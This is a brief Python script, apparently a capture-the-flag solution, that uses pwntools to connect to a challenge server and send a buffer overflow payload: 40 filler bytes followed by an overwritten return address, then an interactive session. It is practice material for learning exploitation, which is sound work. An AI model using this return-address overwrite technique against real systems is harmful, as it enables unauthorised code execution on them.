from pwn import process, remote


HOST = 'ctf-challs.sinf.pt'
PORT = 1337
#io = process("./leap2victory")
io = remote(HOST, PORT, level='debug')
io.recvuntil("try it!\n")

injection = 'A' * 40 + '\xc5\x11\x40\x00\x00'
io.sendline(injection)
io.interactive()
